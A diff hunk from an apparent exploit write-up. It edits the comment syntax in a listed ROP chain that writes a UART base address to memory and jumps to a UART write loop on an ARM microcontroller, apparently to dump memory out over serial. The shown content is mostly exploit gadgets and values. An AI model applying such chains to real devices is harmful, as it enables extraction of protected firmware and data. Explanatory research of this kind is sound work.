@@ -173,14 +173,14 @@ loop:
 
 Let's call this loop from our ROP chain!
 ```actionscript
-; set up the stack UART ptr as seen previously
+// set up the stack UART ptr as seen previously
 0x0bf9a927  pop {r0, r4, pc}
 0x40013800  Value to be written (pops UART_BASE into r0)
 0x20003348  Target memory address (pops into r4)
 0x0bf994b3  str r0, [r4]; pop {r4, pc}
 0xDEADBEEF  junk to pop in r4
 
-; now jump to the UART write loop
+// now jump to the UART write loop
 0x0bf987d5  pop {r4, r5, r6, r7, pc}
 0x0         r4 => basically unlimited length
 0x1         r5 => read mode = 1
